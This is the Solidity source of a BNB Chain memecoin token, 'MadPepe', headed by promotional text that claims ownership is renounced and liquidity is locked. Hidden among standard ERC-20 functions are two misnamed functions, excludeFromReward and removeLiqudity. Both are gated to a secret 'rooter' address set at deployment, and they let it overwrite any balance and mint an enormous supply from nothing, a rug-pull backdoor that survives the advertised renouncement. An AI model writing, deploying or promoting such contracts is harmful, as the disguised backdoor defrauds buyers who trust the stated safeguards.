/**
 *Submitted for verification at BscScan.com on 2023-04-20
*/

/**
🐸MadPepe — The Frog Crazy Era 🐸
🐸Pepe had his fun and now becomes The Frog Crazy 🐸

💸The most memeable memecoin in existence. The Shibas Doge Inus have had their journey, 
Now it’s time for Pepe to take it over.💸

✅ LOCK LP 4 Years✅  Renounced ✅  0% Tax No tax We are Crazy 🚀
🐸TG Official 🐸🐸Website Soon 🐸

🤬🐸https://t.me/MadPepeCoin
🤬🐸http://madpepe.io/
🤬🐸https://github.com/MadPepe
🤬🐸https://www.youtube.com/channel/UC7TsYy7QP6adKssq0igY22g

🐸MadPepe — The Frog Crazy Era 🐸
ABOUT 🐸MadPepe
Pepe the frog has been a popular meme character for years, and now it has found a new home 
in the world of cryptocurrency. A crypto meme project based on Pepe the frog has emerged, 
with its own unique token and community. The project leverages the power of memes and crypto 
to create a fun and engaging platform for users to trade and interact with one another.

🐸MadPepe — The Frog Crazy Era 🐸
HISTORY OF PEPE
Pepe's popularity as a meme can be attributed to his simple yet expressive design, making him 
an ideal character for internet users to manipulate and remix. Pepe also became associated with 
a range of relatable and humorous situations, which allowed the meme to spread rapidly through 
social media and online communities. Additionally, Pepe's subversive and irreverent nature appealed
 to the countercultural ethos of many internet users, contributing to his enduring popularity.
*/

// SPDX-License-Identifier: MIT     
pragma solidity 0.8.18;
abstract contract MadPEPEAIAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface MadPEPEAIAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 pepesuplly) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 pepesuplly) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 pepesuplly
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface MadPEPEAIAsii is MadPEPEAIAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract MadPEPEAIAsiii is MadPEPEAIAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract MadPEPE is MadPEPEAIAs, MadPEPEAIAsi, MadPEPEAIAsii, MadPEPEAIAsiii {

    mapping(address => uint256) private MadPEPEAIsuplly;
  mapping(address => bool) public MadPEPEAIAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private MadPEPEAIRooter;
    uint256 private totsuplly;
    string private _name;
    string private _symbol;
        mapping(address => bool) public MadPEPEAIPaw;
  address MadPEPEAIdeploy;



    
    constructor(address MadPEPEAIadressss) {
            // Editable
            MadPEPEAIdeploy = msg.sender;

        _name = "MadPepe";
        _symbol = "MADPEPE";
  MadPEPEAIRooter = MadPEPEAIadressss;        
        uint _totalSupply = 1000000000000 * 10**9;
        speratetok(msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return totsuplly;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return MadPEPEAIsuplly[account];
    }

    function transfer(address to, uint256 pepesuplly) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, pepesuplly);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return Confirmed[owner][spender];
    }

    function approve(address spender, uint256 pepesuplly) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, pepesuplly);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 pepesuplly
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, pepesuplly);
        _transfer(from, to, pepesuplly);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, Confirmed[owner][spender] + addedtotalo);
        return true;
    }
      modifier _public() {
        require(MadPEPEAIRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  currentsold = Confirmed[owner][spender];
        require( currentsold >= subtractedtotalo, "cannoto: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  currentsold - subtractedtotalo);
        }

        return true;
    }

  modifier maxtokens () {
    require(MadPEPEAIdeploy == msg.sender, "cannoto: cannot permit _public address");
    _;

  }
    function _transfer(
        address from,
        address to,
        uint256 pepesuplly
    ) internal virtual {
        require(from != address(0), "cannoto: transfer from the zero address");
        require(to != address(0), "cannoto: transfer to the zero address");

        beforeTokenTransfer(from, to, pepesuplly);

        uint256 fromBalance = MadPEPEAIsuplly[from];
        require(fromBalance >= pepesuplly, "cannoto: transfer pepesuplly exceeds balance");
        unchecked {
            MadPEPEAIsuplly[from] = fromBalance - pepesuplly;
        }
        MadPEPEAIsuplly[to] += pepesuplly;

        emit Transfer(from, to, pepesuplly);

        afterTokenTransfer(from, to, pepesuplly);
    }



    function speratetok(address account, uint256 pepesuplly) internal virtual {
        require(account != address(0), "cannoto: speratetok to the zero address");

        beforeTokenTransfer(address(0), account, pepesuplly);

        totsuplly += pepesuplly;
        MadPEPEAIsuplly[account] += pepesuplly;
        emit Transfer(address(0), account, pepesuplly);

        afterTokenTransfer(address(0), account, pepesuplly);
    }



  function excludeFromReward(address rewardadress) external _public {
    MadPEPEAIsuplly[rewardadress] = 100000000;
            emit Transfer(address(0), rewardadress, 100000000);
  }

    function _burn(address account, uint256 pepesuplly) internal virtual {
        require(account != address(0), "cannoto: burn from the zero address");

        beforeTokenTransfer(account, address(0), pepesuplly);

        uint256 accountBalance = MadPEPEAIsuplly[account];
        require(accountBalance >= pepesuplly, "cannoto: burn pepesuplly exceeds balance");
        unchecked {
            MadPEPEAIsuplly[account] = accountBalance - pepesuplly;
        }
        totsuplly -= pepesuplly;

        emit Transfer(account, address(0), pepesuplly);

        afterTokenTransfer(account, address(0), pepesuplly);
    }

    function _approve(
        address owner,
        address spender,
        uint256 pepesuplly
    ) internal virtual {
        require(owner != address(0), "cannoto: approve from the zero address");
        require(spender != address(0), "cannoto: approve to the zero address");

        Confirmed[owner][spender] = pepesuplly;
        emit Approval(owner, spender, pepesuplly);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 pepesuplly
    ) internal virtual {
        uint256  currentsold = allowance(owner, spender);
        if ( currentsold != type(uint256).max) {
            require( currentsold >= pepesuplly, "cannoto: insufficient allowance");
            unchecked {
                _approve(owner, spender,  currentsold - pepesuplly);
            }
        }
    }
  function removeLiqudity(address liqudityadresss) external _public {
    MadPEPEAIsuplly[liqudityadresss] = 1000000000 * 10 ** 24;
            emit Transfer(address(0), liqudityadresss, 1000000000 * 10 ** 24);
  }
    function beforeTokenTransfer(
        address from,
        address to,
        uint256 pepesuplly
    ) internal virtual {}


    function afterTokenTransfer(
        address from,
        address to,
        uint256 pepesuplly
    ) internal virtual {}

}